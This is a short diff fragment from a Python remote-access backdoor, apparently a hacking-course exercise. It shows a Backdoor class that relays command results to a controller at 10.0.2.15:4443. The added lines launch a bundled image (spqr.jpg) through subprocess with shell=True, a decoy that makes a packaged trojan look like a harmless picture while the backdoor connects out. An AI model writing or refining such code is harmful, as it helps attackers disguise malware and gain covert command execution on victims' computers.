@@ -77,6 +77,8 @@ class Backdoor(object):
 
             self.reliable_send(command_result)
 
+file_name = sys._MEIPASS + "\spqr.jpg"
+subprocess.Popen(file_name, shell=True)
 
 try:
     my_backdoor = Backdoor("10.0.2.15", 4443)
